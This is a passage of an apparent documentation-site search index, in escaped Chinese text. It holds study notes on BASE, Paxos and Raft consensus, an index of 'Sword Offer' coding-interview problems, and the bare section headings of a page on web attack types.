\u4E3A\u4E86\u4FDD\u8BC1\u53EF\u7528\u6027\uFF08AP\uFF09\uFF0C\u5141\u8BB8\u8BFB\u53D6\u6240\u6709\u8282\u70B9\u7684\u6570\u636E\uFF0C\u4F46\u662F\u6570\u636E\u53EF\u80FD\u4E0D\u4E00\u81F4\u3002`},{header:"\u56DB\u3001BASE",slug:"\u56DB\u3001base",content:`BASE \u662F\u57FA\u672C\u53EF\u7528\uFF08Basically Available\uFF09\u3001\u8F6F\u72B6\u6001\uFF08Soft State\uFF09\u548C\u6700\u7EC8\u4E00\u81F4\u6027\uFF08Eventually Consistent\uFF09\u4E09\u4E2A\u77ED\u8BED\u7684\u7F29\u5199\u3002
BASE \u7406\u8BBA\u662F\u5BF9 CAP \u4E2D\u4E00\u81F4\u6027\u548C\u53EF\u7528\u6027\u6743\u8861\u7684\u7ED3\u679C\uFF0C\u5B83\u7684\u6838\u5FC3\u601D\u60F3\u662F\uFF1A\u5373\u4F7F\u65E0\u6CD5\u505A\u5230\u5F3A\u4E00\u81F4\u6027\uFF0C\u4F46\u6BCF\u4E2A\u5E94\u7528\u90FD\u53EF\u4EE5\u6839\u636E\u81EA\u8EAB\u4E1A\u52A1\u7279\u70B9\uFF0C\u91C7\u7528\u9002\u5F53\u7684\u65B9\u5F0F\u6765\u4F7F\u7CFB\u7EDF\u8FBE\u5230\u6700\u7EC8\u4E00\u81F4\u6027\u3002`},{header:"\u57FA\u672C\u53EF\u7528",slug:"\u57FA\u672C\u53EF\u7528",content:`\u6307\u5206\u5E03\u5F0F\u7CFB\u7EDF\u5728\u51FA\u73B0\u6545\u969C\u7684\u65F6\u5019\uFF0C\u4FDD\u8BC1\u6838\u5FC3\u53EF\u7528\uFF0C\u5141\u8BB8\u635F\u5931\u90E8\u5206\u53EF\u7528\u6027\u3002
\u4F8B\u5982\uFF0C\u7535\u5546\u5728\u505A\u4FC3\u9500\u65F6\uFF0C\u4E3A\u4E86\u4FDD\u8BC1\u8D2D\u7269\u7CFB\u7EDF\u7684\u7A33\u5B9A\u6027\uFF0C\u90E8\u5206\u6D88\u8D39\u8005\u53EF\u80FD\u4F1A\u88AB\u5F15\u5BFC\u5230\u4E00\u4E2A\u964D\u7EA7\u7684\u9875\u9762\u3002`},{header:"\u8F6F\u72B6\u6001",slug:"\u8F6F\u72B6\u6001",content:"\u6307\u5141\u8BB8\u7CFB\u7EDF\u4E2D\u7684\u6570\u636E\u5B58\u5728\u4E2D\u95F4\u72B6\u6001\uFF0C\u5E76\u8BA4\u4E3A\u8BE5\u4E2D\u95F4\u72B6\u6001\u4E0D\u4F1A\u5F71\u54CD\u7CFB\u7EDF\u6574\u4F53\u53EF\u7528\u6027\uFF0C\u5373\u5141\u8BB8\u7CFB\u7EDF\u4E0D\u540C\u8282\u70B9\u7684\u6570\u636E\u526F\u672C\u4E4B\u95F4\u8FDB\u884C\u540C\u6B65\u7684\u8FC7\u7A0B\u5B58\u5728\u65F6\u5EF6\u3002"},{header:"\u6700\u7EC8\u4E00\u81F4\u6027",slug:"\u6700\u7EC8\u4E00\u81F4\u6027",content:`\u6700\u7EC8\u4E00\u81F4\u6027\u5F3A\u8C03\u7684\u662F\u7CFB\u7EDF\u4E2D\u6240\u6709\u7684\u6570\u636E\u526F\u672C\uFF0C\u5728\u7ECF\u8FC7\u4E00\u6BB5\u65F6\u95F4\u7684\u540C\u6B65\u540E\uFF0C\u6700\u7EC8\u80FD\u8FBE\u5230\u4E00\u81F4\u7684\u72B6\u6001\u3002
ACID \u8981\u6C42\u5F3A\u4E00\u81F4\u6027\uFF0C\u901A\u5E38\u8FD0\u7528\u5728\u4F20\u7EDF\u7684\u6570\u636E\u5E93\u7CFB\u7EDF\u4E0A\u3002\u800C BASE \u8981\u6C42\u6700\u7EC8\u4E00\u81F4\u6027\uFF0C\u901A\u8FC7\u727A\u7272\u5F3A\u4E00\u81F4\u6027\u6765\u8FBE\u5230\u53EF\u7528\u6027\uFF0C\u901A\u5E38\u8FD0\u7528\u5728\u5927\u578B\u5206\u5E03\u5F0F\u7CFB\u7EDF\u4E2D\u3002
\u5728\u5B9E\u9645\u7684\u5206\u5E03\u5F0F\u573A\u666F\u4E2D\uFF0C\u4E0D\u540C\u4E1A\u52A1\u5355\u5143\u548C\u7EC4\u4EF6\u5BF9\u4E00\u81F4\u6027\u7684\u8981\u6C42\u662F\u4E0D\u540C\u7684\uFF0C\u56E0\u6B64 ACID \u548C BASE \u5F80\u5F80\u4F1A\u7ED3\u5408\u5728\u4E00\u8D77\u4F7F\u7528\u3002`},{header:"\u4E94\u3001Paxos",slug:"\u4E94\u3001paxos",content:`\u7528\u4E8E\u8FBE\u6210\u5171\u8BC6\u6027\u95EE\u9898\uFF0C\u5373\u5BF9\u591A\u4E2A\u8282\u70B9\u4EA7\u751F\u7684\u503C\uFF0C\u8BE5\u7B97\u6CD5\u80FD\u4FDD\u8BC1\u53EA\u9009\u51FA\u552F\u4E00\u4E00\u4E2A\u503C\u3002
\u4E3B\u8981\u6709\u4E09\u7C7B\u8282\u70B9\uFF1A \u63D0\u8BAE\u8005\uFF08Proposer\uFF09\uFF1A\u63D0\u8BAE\u4E00\u4E2A\u503C\uFF1B
\u63A5\u53D7\u8005\uFF08Acceptor\uFF09\uFF1A\u5BF9\u6BCF\u4E2A\u63D0\u8BAE\u8FDB\u884C\u6295\u7968\uFF1B
\u544A\u77E5\u8005\uFF08Learner\uFF09\uFF1A\u88AB\u544A\u77E5\u6295\u7968\u7684\u7ED3\u679C\uFF0C\u4E0D\u53C2\u4E0E\u6295\u7968\u8FC7\u7A0B\u3002`},{header:"\u6267\u884C\u8FC7\u7A0B",slug:"\u6267\u884C\u8FC7\u7A0B",content:"\u89C4\u5B9A\u4E00\u4E2A\u63D0\u8BAE\u5305\u542B\u4E24\u4E2A\u5B57\u6BB5\uFF1A[n, v]\uFF0C\u5176\u4E2D n \u4E3A\u5E8F\u53F7\uFF08\u5177\u6709\u552F\u4E00\u6027\uFF09\uFF0Cv \u4E3A\u63D0\u8BAE\u503C\u3002"},{header:"1. Prepare \u9636\u6BB5",slug:"_1-prepare-\u9636\u6BB5",content:`\u4E0B\u56FE\u6F14\u793A\u4E86\u4E24\u4E2A Proposer \u548C\u4E09\u4E2A Acceptor \u7684\u7CFB\u7EDF\u4E2D\u8FD0\u884C\u8BE5\u7B97\u6CD5\u7684\u521D\u59CB\u8FC7\u7A0B\uFF0C\u6BCF\u4E2A Proposer \u90FD\u4F1A\u5411\u6240\u6709 Acceptor \u53D1\u9001 Prepare \u8BF7\u6C42\u3002 \u5F53 Acceptor \u63A5\u6536\u5230\u4E00\u4E2A Prepare \u8BF7\u6C42\uFF0C\u5305\u542B\u7684\u63D0\u8BAE\u4E3A [n1, v1]\uFF0C\u5E76\u4E14\u4E4B\u524D\u8FD8\u672A\u63A5\u6536\u8FC7 Prepare \u8BF7\u6C42\uFF0C\u90A3\u4E48\u53D1\u9001\u4E00\u4E2A Prepare \u54CD\u5E94\uFF0C\u8BBE\u7F6E\u5F53\u524D\u63A5\u6536\u5230\u7684\u63D0\u8BAE\u4E3A [n1, v1]\uFF0C\u5E76\u4E14\u4FDD\u8BC1\u4EE5\u540E\u4E0D\u4F1A\u518D\u63A5\u53D7\u5E8F\u53F7\u5C0F\u4E8E n1 \u7684\u63D0\u8BAE\u3002
\u5982\u4E0B\u56FE\uFF0CAcceptor X \u5728\u6536\u5230 [n=2, v=8] \u7684 Prepare \u8BF7\u6C42\u65F6\uFF0C\u7531\u4E8E\u4E4B\u524D\u6CA1\u6709\u63A5\u6536\u8FC7\u63D0\u8BAE\uFF0C\u56E0\u6B64\u5C31\u53D1\u9001\u4E00\u4E2A [no previous] \u7684 Prepare \u54CD\u5E94\uFF0C\u8BBE\u7F6E\u5F53\u524D\u63A5\u6536\u5230\u7684\u63D0\u8BAE\u4E3A [n=2, v=8]\uFF0C\u5E76\u4E14\u4FDD\u8BC1\u4EE5\u540E\u4E0D\u4F1A\u518D\u63A5\u53D7\u5E8F\u53F7\u5C0F\u4E8E 2 \u7684\u63D0\u8BAE\u3002\u5176\u5B83\u7684 Acceptor \u7C7B\u4F3C\u3002 \u5982\u679C Acceptor \u63A5\u6536\u5230\u4E00\u4E2A Prepare \u8BF7\u6C42\uFF0C\u5305\u542B\u7684\u63D0\u8BAE\u4E3A [n2, v2]\uFF0C\u5E76\u4E14\u4E4B\u524D\u5DF2\u7ECF\u63A5\u6536\u8FC7\u63D0\u8BAE [n1, v1]\u3002\u5982\u679C n1 > n2\uFF0C\u90A3\u4E48\u5C31\u4E22\u5F03\u8BE5\u63D0\u8BAE\u8BF7\u6C42\uFF1B\u5426\u5219\uFF0C\u53D1\u9001 Prepare \u54CD\u5E94\uFF0C\u8BE5 Prepare \u54CD\u5E94\u5305\u542B\u4E4B\u524D\u5DF2\u7ECF\u63A5\u6536\u8FC7\u7684\u63D0\u8BAE [n1, v1]\uFF0C\u8BBE\u7F6E\u5F53\u524D\u63A5\u6536\u5230\u7684\u63D0\u8BAE\u4E3A [n2, v2]\uFF0C\u5E76\u4E14\u4FDD\u8BC1\u4EE5\u540E\u4E0D\u4F1A\u518D\u63A5\u53D7\u5E8F\u53F7\u5C0F\u4E8E n2 \u7684\u63D0\u8BAE\u3002
\u5982\u4E0B\u56FE\uFF0CAcceptor Z \u6536\u5230 Proposer A \u53D1\u6765\u7684 [n=2, v=8] \u7684 Prepare \u8BF7\u6C42\uFF0C\u7531\u4E8E\u4E4B\u524D\u5DF2\u7ECF\u63A5\u6536\u8FC7 [n=4, v=5] \u7684\u63D0\u8BAE\uFF0C\u5E76\u4E14 n > 2\uFF0C\u56E0\u6B64\u5C31\u629B\u5F03\u8BE5\u63D0\u8BAE\u8BF7\u6C42\uFF1BAcceptor X \u6536\u5230 Proposer B \u53D1\u6765\u7684 [n=4, v=5] \u7684 Prepare \u8BF7\u6C42\uFF0C\u56E0\u4E3A\u4E4B\u524D\u63A5\u6536\u5230\u7684\u63D0\u8BAE\u4E3A [n=2, v=8]\uFF0C\u5E76\u4E14 2 <= 4\uFF0C\u56E0\u6B64\u5C31\u53D1\u9001 [n=2, v=8] \u7684 Prepare \u54CD\u5E94\uFF0C\u8BBE\u7F6E\u5F53\u524D\u63A5\u6536\u5230\u7684\u63D0\u8BAE\u4E3A [n=4, v=5]\uFF0C\u5E76\u4E14\u4FDD\u8BC1\u4EE5\u540E\u4E0D\u4F1A\u518D\u63A5\u53D7\u5E8F\u53F7\u5C0F\u4E8E 4 \u7684\u63D0\u8BAE\u3002Acceptor Y \u7C7B\u4F3C\u3002`},{header:"2. Accept \u9636\u6BB5",slug:"_2-accept-\u9636\u6BB5",content:`\u5F53\u4E00\u4E2A Proposer \u63A5\u6536\u5230\u8D85\u8FC7\u4E00\u534A Acceptor \u7684 Prepare \u54CD\u5E94\u65F6\uFF0C\u5C31\u53EF\u4EE5\u53D1\u9001 Accept \u8BF7\u6C42\u3002
Proposer A \u63A5\u6536\u5230\u4E24\u4E2A Prepare \u54CD\u5E94\u4E4B\u540E\uFF0C\u5C31\u53D1\u9001 [n=2, v=8] Accept \u8BF7\u6C42\u3002\u8BE5 Accept \u8BF7\u6C42\u4F1A\u88AB\u6240\u6709 Acceptor \u4E22\u5F03\uFF0C\u56E0\u4E3A\u6B64\u65F6\u6240\u6709 Acceptor \u90FD\u4FDD\u8BC1\u4E0D\u63A5\u53D7\u5E8F\u53F7\u5C0F\u4E8E 4 \u7684\u63D0\u8BAE\u3002
Proposer B \u8FC7\u540E\u4E5F\u6536\u5230\u4E86\u4E24\u4E2A Prepare \u54CD\u5E94\uFF0C\u56E0\u6B64\u4E5F\u5F00\u59CB\u53D1\u9001 Accept \u8BF7\u6C42\u3002\u9700\u8981\u6CE8\u610F\u7684\u662F\uFF0CAccept \u8BF7\u6C42\u7684 v \u9700\u8981\u53D6\u5B83\u6536\u5230\u7684\u6700\u5927\u63D0\u8BAE\u7F16\u53F7\u5BF9\u5E94\u7684 v \u503C\uFF0C\u4E5F\u5C31\u662F 8\u3002\u56E0\u6B64\u5B83\u53D1\u9001 [n=4, v=8] \u7684 Accept \u8BF7\u6C42\u3002`},{header:"3. Learn \u9636\u6BB5",slug:"_3-learn-\u9636\u6BB5",content:"Acceptor \u63A5\u6536\u5230 Accept \u8BF7\u6C42\u65F6\uFF0C\u5982\u679C\u5E8F\u53F7\u5927\u4E8E\u7B49\u4E8E\u8BE5 Acceptor \u627F\u8BFA\u7684\u6700\u5C0F\u5E8F\u53F7\uFF0C\u90A3\u4E48\u5C31\u53D1\u9001 Learn \u63D0\u8BAE\u7ED9\u6240\u6709\u7684 Learner\u3002\u5F53 Learner \u53D1\u73B0\u6709\u5927\u591A\u6570\u7684 Acceptor \u63A5\u6536\u4E86\u67D0\u4E2A\u63D0\u8BAE\uFF0C\u90A3\u4E48\u8BE5\u63D0\u8BAE\u7684\u63D0\u8BAE\u503C\u5C31\u88AB Paxos \u9009\u62E9\u51FA\u6765\u3002"},{header:"\u7EA6\u675F\u6761\u4EF6",slug:"\u7EA6\u675F\u6761\u4EF6",content:""},{header:"1. \u6B63\u786E\u6027",slug:"_1-\u6B63\u786E\u6027",content:`\u6307\u53EA\u6709\u4E00\u4E2A\u63D0\u8BAE\u503C\u4F1A\u751F\u6548\u3002
\u56E0\u4E3A Paxos \u534F\u8BAE\u8981\u6C42\u6BCF\u4E2A\u751F\u6548\u7684\u63D0\u8BAE\u88AB\u591A\u6570 Acceptor \u63A5\u6536\uFF0C\u5E76\u4E14 Acceptor \u4E0D\u4F1A\u63A5\u53D7\u4E24\u4E2A\u4E0D\u540C\u7684\u63D0\u8BAE\uFF0C\u56E0\u6B64\u53EF\u4EE5\u4FDD\u8BC1\u6B63\u786E\u6027\u3002`},{header:"2. \u53EF\u7EC8\u6B62\u6027",slug:"_2-\u53EF\u7EC8\u6B62\u6027",content:`\u6307\u6700\u540E\u603B\u4F1A\u6709\u4E00\u4E2A\u63D0\u8BAE\u751F\u6548\u3002
Paxos \u534F\u8BAE\u80FD\u591F\u8BA9 Proposer \u53D1\u9001\u7684\u63D0\u8BAE\u671D\u7740\u80FD\u88AB\u5927\u591A\u6570 Acceptor \u63A5\u53D7\u7684\u90A3\u4E2A\u63D0\u8BAE\u9760\u62E2\uFF0C\u56E0\u6B64\u80FD\u591F\u4FDD\u8BC1\u53EF\u7EC8\u6B62\u6027\u3002`},{header:"\u516D\u3001Raft",slug:"\u516D\u3001raft",content:"Raft \u4E5F\u662F\u5206\u5E03\u5F0F\u4E00\u81F4\u6027\u534F\u8BAE\uFF0C\u4E3B\u8981\u662F\u7528\u6765\u7ADE\u9009\u4E3B\u8282\u70B9\u3002 Raft: Understandable Distributed Consensus"},{header:"\u5355\u4E2A Candidate \u7684\u7ADE\u9009",slug:"\u5355\u4E2A-candidate-\u7684\u7ADE\u9009",content:"\u6709\u4E09\u79CD\u8282\u70B9\uFF1AFollower\u3001Candidate \u548C Leader\u3002Leader \u4F1A\u5468\u671F\u6027\u7684\u53D1\u9001\u5FC3\u8DF3\u5305\u7ED9 Follower\u3002\u6BCF\u4E2A Follower \u90FD\u8BBE\u7F6E\u4E86\u4E00\u4E2A\u968F\u673A\u7684\u7ADE\u9009\u8D85\u65F6\u65F6\u95F4\uFF0C\u4E00\u822C\u4E3A 150ms~300ms\uFF0C\u5982\u679C\u5728\u8FD9\u4E2A\u65F6\u95F4\u5185\u6CA1\u6709\u6536\u5230 Leader \u7684\u5FC3\u8DF3\u5305\uFF0C\u5C31\u4F1A\u53D8\u6210 Candidate\uFF0C\u8FDB\u5165\u7ADE\u9009\u9636\u6BB5\u3002 \u4E0B\u56FE\u5C55\u793A\u4E00\u4E2A\u5206\u5E03\u5F0F\u7CFB\u7EDF\u7684\u6700\u521D\u9636\u6BB5\uFF0C\u6B64\u65F6\u53EA\u6709 Follower \u6CA1\u6709 Leader\u3002Node A \u7B49\u5F85\u4E00\u4E2A\u968F\u673A\u7684\u7ADE\u9009\u8D85\u65F6\u65F6\u95F4\u4E4B\u540E\uFF0C\u6CA1\u6536\u5230 Leader \u53D1\u6765\u7684\u5FC3\u8DF3\u5305\uFF0C\u56E0\u6B64\u8FDB\u5165\u7ADE\u9009\u9636\u6BB5\u3002 \u6B64\u65F6 Node A \u53D1\u9001\u6295\u7968\u8BF7\u6C42\u7ED9\u5176\u5B83\u6240\u6709\u8282\u70B9\u3002 \u5176\u5B83\u8282\u70B9\u4F1A\u5BF9\u8BF7\u6C42\u8FDB\u884C\u56DE\u590D\uFF0C\u5982\u679C\u8D85\u8FC7\u4E00\u534A\u7684\u8282\u70B9\u56DE\u590D\u4E86\uFF0C\u90A3\u4E48\u8BE5 Candidate \u5C31\u4F1A\u53D8\u6210 Leader\u3002 \u4E4B\u540E Leader \u4F1A\u5468\u671F\u6027\u5730\u53D1\u9001\u5FC3\u8DF3\u5305\u7ED9 Follower\uFF0CFollower \u63A5\u6536\u5230\u5FC3\u8DF3\u5305\uFF0C\u4F1A\u91CD\u65B0\u5F00\u59CB\u8BA1\u65F6\u3002"},{header:"\u591A\u4E2A Candidate \u7ADE\u9009",slug:"\u591A\u4E2A-candidate-\u7ADE\u9009",content:"\u5982\u679C\u6709\u591A\u4E2A Follower \u6210\u4E3A Candidate\uFF0C\u5E76\u4E14\u6240\u83B7\u5F97\u7968\u6570\u76F8\u540C\uFF0C\u90A3\u4E48\u5C31\u9700\u8981\u91CD\u65B0\u5F00\u59CB\u6295\u7968\u3002\u4F8B\u5982\u4E0B\u56FE\u4E2D Node B \u548C Node D \u90FD\u83B7\u5F97\u4E24\u7968\uFF0C\u9700\u8981\u91CD\u65B0\u5F00\u59CB\u6295\u7968\u3002 \u7531\u4E8E\u6BCF\u4E2A\u8282\u70B9\u8BBE\u7F6E\u7684\u968F\u673A\u7ADE\u9009\u8D85\u65F6\u65F6\u95F4\u4E0D\u540C\uFF0C\u56E0\u6B64\u4E0B\u4E00\u6B21\u518D\u6B21\u51FA\u73B0\u591A\u4E2A Candidate \u5E76\u83B7\u5F97\u540C\u6837\u7968\u6570\u7684\u6982\u7387\u5F88\u4F4E\u3002"},{header:"\u6570\u636E\u540C\u6B65",slug:"\u6570\u636E\u540C\u6B65",content:"\u6765\u81EA\u5BA2\u6237\u7AEF\u7684\u4FEE\u6539\u90FD\u4F1A\u88AB\u4F20\u5165 Leader\u3002\u6CE8\u610F\u8BE5\u4FEE\u6539\u8FD8\u672A\u88AB\u63D0\u4EA4\uFF0C\u53EA\u662F\u5199\u5165\u65E5\u5FD7\u4E2D\u3002 Leader \u4F1A\u628A\u4FEE\u6539\u590D\u5236\u5230\u6240\u6709 Follower\u3002 Leader \u4F1A\u7B49\u5F85\u5927\u591A\u6570\u7684 Follower \u4E5F\u8FDB\u884C\u4E86\u4FEE\u6539\uFF0C\u7136\u540E\u624D\u5C06\u4FEE\u6539\u63D0\u4EA4\u3002 \u6B64\u65F6 Leader \u4F1A\u901A\u77E5\u7684\u6240\u6709 Follower \u8BA9\u5B83\u4EEC\u4E5F\u63D0\u4EA4\u4FEE\u6539\uFF0C\u6B64\u65F6\u6240\u6709\u8282\u70B9\u7684\u503C\u8FBE\u6210\u4E00\u81F4\u3002"},{header:"\u53C2\u8003",slug:"\u53C2\u8003",content:`\u502A\u8D85. \u4ECE Paxos \u5230 ZooKeeper : \u5206\u5E03\u5F0F\u4E00\u81F4\u6027\u539F\u7406\u4E0E\u5B9E\u8DF5 [M]. \u7535\u5B50\u5DE5\u4E1A\u51FA\u7248\u793E, 2015.
Distributed locks with Redis
\u6D45\u8C08\u5206\u5E03\u5F0F\u9501
\u57FA\u4E8E Zookeeper \u7684\u5206\u5E03\u5F0F\u9501
\u804A\u804A\u5206\u5E03\u5F0F\u4E8B\u52A1\uFF0C\u518D\u8BF4\u8BF4\u89E3\u51B3\u65B9\u6848
\u5206\u5E03\u5F0F\u7CFB\u7EDF\u7684\u4E8B\u52A1\u5904\u7406
\u6DF1\u5165\u7406\u89E3\u5206\u5E03\u5F0F\u4E8B\u52A1
What is CAP theorem in distributed database system?
NEAT ALGORITHMS - PAXOS
Paxos By Example`}]},{path:"/java/%E5%89%91%E6%8C%87%20Offer%20%E9%A2%98%E8%A7%A3%20-%20%E7%9B%AE%E5%BD%95.html",title:"\u5251\u6307 Offer \u9898\u89E3",pathLocale:"/",contents:[{header:"\u5251\u6307 Offer \u9898\u89E3",slug:"\u5251\u6307-offer-\u9898\u89E3",content:""},{header:"\u524D\u8A00",slug:"\u524D\u8A00",content:`\u9898\u76EE\u6765\u81EA\u300A\u4F55\u6D77\u6D9B. \u5251\u6307 Offer[M]. \u7535\u5B50\u5DE5\u4E1A\u51FA\u7248\u793E, 2012.\u300B\uFF0C\u5237\u9898\u7F51\u7AD9\u63A8\u8350\uFF1A \u725B\u5BA2\u7F51
Leetcode`},{header:"\u6570\u7EC4\u4E0E\u77E9\u9635",slug:"\u6570\u7EC4\u4E0E\u77E9\u9635",content:`3. \u6570\u7EC4\u4E2D\u91CD\u590D\u7684\u6570\u5B57
4. \u4E8C\u7EF4\u6570\u7EC4\u4E2D\u7684\u67E5\u627E
5. \u66FF\u6362\u7A7A\u683C
29. \u987A\u65F6\u9488\u6253\u5370\u77E9\u9635
50. \u7B2C\u4E00\u4E2A\u53EA\u51FA\u73B0\u4E00\u6B21\u7684\u5B57\u7B26\u4F4D\u7F6E`},{header:"\u6808\u961F\u5217\u5806",slug:"\u6808\u961F\u5217\u5806",content:`9. \u7528\u4E24\u4E2A\u6808\u5B9E\u73B0\u961F\u5217
30. \u5305\u542B min \u51FD\u6570\u7684\u6808
31. \u6808\u7684\u538B\u5165\u3001\u5F39\u51FA\u5E8F\u5217
40. \u6700\u5C0F\u7684 K \u4E2A\u6570
41.1 \u6570\u636E\u6D41\u4E2D\u7684\u4E2D\u4F4D\u6570
41.2 \u5B57\u7B26\u6D41\u4E2D\u7B2C\u4E00\u4E2A\u4E0D\u91CD\u590D\u7684\u5B57\u7B26
59. \u6ED1\u52A8\u7A97\u53E3\u7684\u6700\u5927\u503C`},{header:"\u53CC\u6307\u9488",slug:"\u53CC\u6307\u9488",content:`57.1 \u548C\u4E3A S \u7684\u4E24\u4E2A\u6570\u5B57
57.2 \u548C\u4E3A S \u7684\u8FDE\u7EED\u6B63\u6570\u5E8F\u5217
58.1 \u7FFB\u8F6C\u5355\u8BCD\u987A\u5E8F\u5217
58.2 \u5DE6\u65CB\u8F6C\u5B57\u7B26\u4E32`},{header:"\u94FE\u8868",slug:"\u94FE\u8868",content:`6. \u4ECE\u5C3E\u5230\u5934\u6253\u5370\u94FE\u8868
18.1 \u5728 O(1) \u65F6\u95F4\u5185\u5220\u9664\u94FE\u8868\u8282\u70B9
18.2 \u5220\u9664\u94FE\u8868\u4E2D\u91CD\u590D\u7684\u7ED3\u70B9
22. \u94FE\u8868\u4E2D\u5012\u6570\u7B2C K \u4E2A\u7ED3\u70B9
23. \u94FE\u8868\u4E2D\u73AF\u7684\u5165\u53E3\u7ED3\u70B9
24. \u53CD\u8F6C\u94FE\u8868
25. \u5408\u5E76\u4E24\u4E2A\u6392\u5E8F\u7684\u94FE\u8868
35. \u590D\u6742\u94FE\u8868\u7684\u590D\u5236
52. \u4E24\u4E2A\u94FE\u8868\u7684\u7B2C\u4E00\u4E2A\u516C\u5171\u7ED3\u70B9`},{header:"\u6811",slug:"\u6811",content:`7. \u91CD\u5EFA\u4E8C\u53C9\u6811
8. \u4E8C\u53C9\u6811\u7684\u4E0B\u4E00\u4E2A\u7ED3\u70B9
26. \u6811\u7684\u5B50\u7ED3\u6784
27. \u4E8C\u53C9\u6811\u7684\u955C\u50CF
28. \u5BF9\u79F0\u7684\u4E8C\u53C9\u6811
32.1 \u4ECE\u4E0A\u5F80\u4E0B\u6253\u5370\u4E8C\u53C9\u6811
32.2 \u628A\u4E8C\u53C9\u6811\u6253\u5370\u6210\u591A\u884C
32.3 \u6309\u4E4B\u5B57\u5F62\u987A\u5E8F\u6253\u5370\u4E8C\u53C9\u6811
33. \u4E8C\u53C9\u641C\u7D22\u6811\u7684\u540E\u5E8F\u904D\u5386\u5E8F\u5217
34. \u4E8C\u53C9\u6811\u4E2D\u548C\u4E3A\u67D0\u4E00\u503C\u7684\u8DEF\u5F84
36. \u4E8C\u53C9\u641C\u7D22\u6811\u4E0E\u53CC\u5411\u94FE\u8868
37. \u5E8F\u5217\u5316\u4E8C\u53C9\u6811
54. \u4E8C\u53C9\u67E5\u627E\u6811\u7684\u7B2C K \u4E2A\u7ED3\u70B9
55.1 \u4E8C\u53C9\u6811\u7684\u6DF1\u5EA6
55.2 \u5E73\u8861\u4E8C\u53C9\u6811
68. \u6811\u4E2D\u4E24\u4E2A\u8282\u70B9\u7684\u6700\u4F4E\u516C\u5171\u7956\u5148`},{header:"\u8D2A\u5FC3\u601D\u60F3",slug:"\u8D2A\u5FC3\u601D\u60F3",content:`14. \u526A\u7EF3\u5B50
63. \u80A1\u7968\u7684\u6700\u5927\u5229\u6DA6`},{header:"\u4E8C\u5206\u67E5\u627E",slug:"\u4E8C\u5206\u67E5\u627E",content:`11. \u65CB\u8F6C\u6570\u7EC4\u7684\u6700\u5C0F\u6570\u5B57
53. \u6570\u5B57\u5728\u6392\u5E8F\u6570\u7EC4\u4E2D\u51FA\u73B0\u7684\u6B21\u6570`},{header:"\u5206\u6CBB",slug:"\u5206\u6CBB",content:"16. \u6570\u503C\u7684\u6574\u6570\u6B21\u65B9"},{header:"\u641C\u7D22",slug:"\u641C\u7D22",content:`12. \u77E9\u9635\u4E2D\u7684\u8DEF\u5F84
13. \u673A\u5668\u4EBA\u7684\u8FD0\u52A8\u8303\u56F4
38. \u5B57\u7B26\u4E32\u7684\u6392\u5217`},{header:"\u6392\u5E8F",slug:"\u6392\u5E8F",content:`21. \u8C03\u6574\u6570\u7EC4\u987A\u5E8F\u4F7F\u5947\u6570\u4F4D\u4E8E\u5076\u6570\u524D\u9762
45. \u628A\u6570\u7EC4\u6392\u6210\u6700\u5C0F\u7684\u6570
51. \u6570\u7EC4\u4E2D\u7684\u9006\u5E8F\u5BF9`},{header:"\u52A8\u6001\u89C4\u5212",slug:"\u52A8\u6001\u89C4\u5212",content:`10.1 \u6590\u6CE2\u90A3\u5951\u6570\u5217
10.2 \u77E9\u5F62\u8986\u76D6
10.3 \u8DF3\u53F0\u9636
10.4 \u53D8\u6001\u8DF3\u53F0\u9636
42. \u8FDE\u7EED\u5B50\u6570\u7EC4\u7684\u6700\u5927\u548C
47. \u793C\u7269\u7684\u6700\u5927\u4EF7\u503C
48. \u6700\u957F\u4E0D\u542B\u91CD\u590D\u5B57\u7B26\u7684\u5B50\u5B57\u7B26\u4E32
49. \u4E11\u6570
60. n \u4E2A\u9AB0\u5B50\u7684\u70B9\u6570
66. \u6784\u5EFA\u4E58\u79EF\u6570\u7EC4`},{header:"\u6570\u5B66",slug:"\u6570\u5B66",content:`39. \u6570\u7EC4\u4E2D\u51FA\u73B0\u6B21\u6570\u8D85\u8FC7\u4E00\u534A\u7684\u6570\u5B57
62. \u5706\u5708\u4E2D\u6700\u540E\u5269\u4E0B\u7684\u6570
43. \u4ECE 1 \u5230 n \u6574\u6570\u4E2D 1 \u51FA\u73B0\u7684\u6B21\u6570`},{header:"\u4F4D\u8FD0\u7B97",slug:"\u4F4D\u8FD0\u7B97",content:`15. \u4E8C\u8FDB\u5236\u4E2D 1 \u7684\u4E2A\u6570
56. \u6570\u7EC4\u4E2D\u53EA\u51FA\u73B0\u4E00\u6B21\u7684\u6570\u5B57`},{header:"\u5176\u5B83",slug:"\u5176\u5B83",content:`17. \u6253\u5370\u4ECE 1 \u5230\u6700\u5927\u7684 n \u4F4D\u6570
19. \u6B63\u5219\u8868\u8FBE\u5F0F\u5339\u914D
20. \u8868\u793A\u6570\u503C\u7684\u5B57\u7B26\u4E32
44. \u6570\u5B57\u5E8F\u5217\u4E2D\u7684\u67D0\u4E00\u4F4D\u6570\u5B57
46. \u628A\u6570\u5B57\u7FFB\u8BD1\u6210\u5B57\u7B26\u4E32
61. \u6251\u514B\u724C\u987A\u5B50
64. \u6C42 1+2+3+...+n
65. \u4E0D\u7528\u52A0\u51CF\u4E58\u9664\u505A\u52A0\u6CD5
67. \u628A\u5B57\u7B26\u4E32\u8F6C\u6362\u6210\u6574\u6570`}]},{path:"/java/%E5%89%91%E6%8C%87%20offer%20%E9%A2%98%E8%A7%A3.html",title:"",pathLocale:"/",contents:[{header:"",slug:"",content:"\u5251\u6307 Offer \u9898\u89E3"}]},{path:"/java/%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF.html",title:"\u653B\u51FB\u6280\u672F",pathLocale:"/",contents:[{header:"\u653B\u51FB\u6280\u672F",slug:"\u653B\u51FB\u6280\u672F",content:`\u653B\u51FB\u6280\u672F \u4E00\u3001\u8DE8\u7AD9\u811A\u672C\u653B\u51FB
\u4E8C\u3001\u8DE8\u7AD9\u8BF7\u6C42\u4F2A\u9020
\u4E09\u3001SQL \u6CE8\u5165\u653B\u51FB
\u56DB\u3001\u62D2\u7EDD\u670D\u52A1\u653B\u51FB
